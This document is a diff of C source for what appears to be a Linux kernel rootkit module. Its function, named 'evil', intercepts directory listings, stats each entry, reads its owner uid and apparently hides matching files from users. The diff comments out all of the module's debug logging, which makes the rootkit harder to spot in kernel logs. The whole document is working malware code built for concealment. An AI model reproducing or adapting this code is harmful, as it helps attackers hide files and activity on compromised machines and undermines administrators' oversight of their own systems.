@@ -38,26 +38,26 @@ int __always_inline evil(struct linux_dirent __user * dirent, int res, int fd) {
 
     kdirent = kzalloc(res, GFP_KERNEL);
 	if (kdirent == NULL){
-        printk(KERN_DEBUG "kzalloc failed\n");
+        //printk(KERN_DEBUG "kzalloc failed\n");
 		return res;
     }
 
 	err = copy_from_user(kdirent, dirent, res);
 	if (err){
-        printk(KERN_DEBUG "can not copy from user!\n");
+        //printk(KERN_DEBUG "can not copy from user!\n");
 		goto out;
     }
 
     int (*vfs_fstatat_ptr)(int, const char __user *, struct kstat *, int) = (int (*)(int, const char __user *, struct kstat *, int))lookup_name("vfs_fstatat");
 
-    printk(KERN_DEBUG "vfs_fstatat_ptr is at %lx\n", vfs_fstatat_ptr);
+    //printk(KERN_DEBUG "vfs_fstatat_ptr is at %lx\n", vfs_fstatat_ptr);
 
 	while (off < res) {
 		kdir = (void *)kdirent + off;
         dir = (void *)dirent + off;
         err = vfs_fstatat_ptr(fd, dir->d_name, stat, 0);
         if (err){
-            printk(KERN_DEBUG "can not read file attributes!\n");
+            //printk(KERN_DEBUG "can not read file attributes!\n");
 		    goto out;
         }
         user = (int)stat->uid.val;
@@ -77,7 +77,7 @@ int __always_inline evil(struct linux_dirent __user * dirent, int res, int fd) {
 	}
 	err = copy_to_user(dirent, kdirent, res);
 	if (err){
-        printk(KERN_DEBUG "can not copy back to user!\n");
+        //printk(KERN_DEBUG "can not copy back to user!\n");
 		goto out;
     }
     out:
